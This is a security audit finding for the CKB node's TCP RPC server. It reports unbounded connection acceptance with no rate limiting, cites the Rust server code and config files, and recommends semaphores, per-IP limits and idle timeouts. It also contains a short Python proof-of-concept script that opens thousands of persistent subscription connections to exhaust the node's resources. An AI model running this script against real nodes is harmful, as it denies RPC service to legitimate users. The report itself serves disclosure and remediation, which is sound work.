### Title
Unbounded TCP RPC Connection Acceptance Without Rate Limiting or Connection Count Cap - (File: rpc/src/server.rs)

### Summary
The CKB RPC TCP server (`start_tcp_server`) accepts an unlimited number of concurrent connections with no connection count limit, no per-IP rate limiting, and no request-rate throttle. Every accepted connection spawns an independent Tokio task that holds a long-lived subscription stream. An unprivileged local or remote caller (when `tcp_listen_address` is exposed) can exhaust file descriptors, memory, and Tokio worker threads by opening thousands of persistent TCP connections, causing RPC unavailability for legitimate users.

### Finding Description

`start_tcp_server` in `rpc/src/server.rs` runs an unbounded `while let Ok((stream, _)) = listener.accept().await` loop and calls `tokio::spawn` for every accepted connection with no counter, semaphore, or connection-limit guard:

```rust
while let Ok((stream, _)) = listener.accept().await {
    let rpc = Arc::clone(&rpc);
    let stream_config = stream_config.clone();
    let codec = codec.clone();
    tokio::spawn(async move {          // ← spawned unconditionally
        ...
        serve_stream_sink(&rpc, w, r, stream_config).await
    });
}
```

Each spawned task keeps the TCP stream open for the lifetime of the subscription session. There is no:
- maximum concurrent connection count,
- per-IP connection limit,
- per-IP or global request-rate limit,
- idle-connection timeout beyond the codec's own framing.

The HTTP/WS path (`start_server`) uses `axum::serve` which inherits OS-level backlog limits but also applies no application-level connection cap or rate limit.

Additionally, the `rpc_batch_limit` guard that exists for batch JSON-RPC requests is **opt-in and disabled by default** (`# rpc_batch_limit = 2000` is commented out in `resource/ckb.toml`), meaning even the batch-size protection is absent in default deployments.

### Impact Explanation

- **Resource exhaustion / DoS**: An attacker opens N persistent TCP connections to the subscription port. Each connection holds a Tokio task, a broadcast receiver, and OS file descriptors. At scale this exhausts the process's file-descriptor limit (default 1024 on many Linux systems), Tokio thread pool capacity, and heap memory, making the RPC server unresponsive to legitimate callers (miners, wallets, indexers).
- **Subscription amplification**: Each connection can call `subscribe` on multiple topics. The broadcast channel delivers a copy of every new block/transaction to every subscriber, multiplying serialization and send work linearly with attacker-controlled connection count.
- **No recovery path**: Because there is no eviction or backpressure mechanism in `start_tcp_server`, the node cannot shed load without a full restart.

### Likelihood Explanation

- The TCP RPC port is opt-in (`tcp_listen_address`) but is documented and commonly enabled by operators who need subscription support (wallets, block explorers, indexers).
- The default `listen_address` is `127.0.0.1`, but operators frequently expose the TCP port on `0.0.0.0` for remote subscribers, making it reachable by any network peer.
- No authentication is required; any TCP client can connect.
- The attack requires only a standard TCP client and a loop — no special protocol knowledge.

**Impact: 3 | Likelihood: 3**

### Recommendation

1. **Enforce a maximum concurrent connection count** in `start_tcp_server` using a `tokio::sync::Semaphore` or an atomic counter; reject (close) connections that exceed the cap.
2. **Add a per-IP connection limit** to prevent a single source from monopolizing the slot pool.
3. **Enable `rpc_batch_limit` by default** (remove the comment in `resource/ckb.toml`) so the batch-size guard is active without operator action.
4. **Add an idle-connection timeout** for TCP sessions that have not sent a valid JSON-RPC frame within a configurable window.

### Proof of Concept

```python
import socket, threading, time

TARGET = ("127.0.0.1", 18114)   # tcp_listen_address
CONNECTIONS = 2000

socks = []
for i in range(CONNECTIONS):
    s = socket.socket()
    s.connect(TARGET)
    # Subscribe to new_tip_block to hold the connection open
    s.sendall(b'{"id":1,"jsonrpc":"2.0","method":"subscribe","params":["new_tip_block"]}\n')
    socks.append(s)
    if i % 100 == 0:
        print(f"Opened {i} connections")

print("Holding connections — RPC now unresponsive to legitimate callers")
time.sleep(3600)
```

After `CONNECTIONS` reaches the process file-descriptor limit, `listener.accept()` begins returning errors and legitimate RPC calls time out.

---

**Root cause location:** [1](#0-0) 

The unbounded `tokio::spawn` per accepted connection with no connection counter or semaphore is the direct root cause. [2](#0-1) 

The `rpc_batch_limit` is opt-in and commented out by default, leaving the batch-size guard inactive: [3](#0-2) 

The `RpcConfig` struct has no field for a maximum TCP connection count, confirming the absence of any such limit at the configuration layer: [4](#0-3)

### Citations

**File:** rpc/src/server.rs (L156-202)
```rust
    async fn start_tcp_server(
        rpc: Arc<MetaIoHandler<Option<Session>>>,
        tcp_listen_address: String,
        handler: Handle,
    ) -> Result<SocketAddr, AnyError> {
        // TCP server with line delimited json codec.
        let listener = TcpListener::bind(tcp_listen_address).await?;
        let tcp_address = listener.local_addr()?;
        handler.spawn(async move {
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
            let stream_config = StreamServerConfig::default()
                .with_channel_size(4)
                .with_pipeline_size(4)
                .with_shutdown(async move {
                    new_tokio_exit_rx().cancelled().await;
                });

            let exit_signal: CancellationToken = new_tokio_exit_rx();
            tokio::select! {
                _ = async {
                        while let Ok((stream, _)) = listener.accept().await {
                            let rpc = Arc::clone(&rpc);
                            let stream_config = stream_config.clone();
                            let codec = codec.clone();
                            tokio::spawn(async move {
                                let (r, w) = stream.into_split();
                                let r = FramedRead::new(r, codec.clone()).map_ok(StreamMsg::Str);
                                let w = FramedWrite::new(w, codec).with(|msg| async move {
                                    Ok::<_, LinesCodecError>(match msg {
                                        StreamMsg::Str(msg) => msg,
                                        _ => "".into(),
                                    })
                                });
                                tokio::pin!(w);
                                if let Err(err) = serve_stream_sink(&rpc, w, r, stream_config).await {
                                    info!("TCP RPCServer error: {:?}", err);
                                }
                            });
                        }
                    } => {},
                _ = exit_signal.cancelled() => {
                    info!("TCP RPCServer stopped");
                }
            }
        });
        Ok(tcp_address)
    }
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** util/app-config/src/configs/rpc.rs (L26-61)
```rust
pub struct Config {
    /// RPC server listen addresses.
    pub listen_address: String,
    /// RPC TCP server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub tcp_listen_address: Option<String>,
    /// RPC WS server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub ws_listen_address: Option<String>,
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
    /// Number of RPC worker threads.
    pub threads: Option<usize>,
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
    /// Enabled RPC modules.
    pub modules: Vec<Module>,
    /// Rejects txs with scripts that might trigger known bugs
    #[serde(default)]
    pub reject_ill_transactions: bool,
    /// Whether enable deprecated RPC methods.
    ///
    /// Deprecated RPC methods are disabled by default.
    #[serde(default)]
    pub enable_deprecated_rpc: bool,
    /// Customized extra well known lock scripts.
    #[serde(default)]
    pub extra_well_known_lock_scripts: Vec<Script>,
    /// Customized extra well known type scripts.
    #[serde(default)]
    pub extra_well_known_type_scripts: Vec<Script>,
}
```
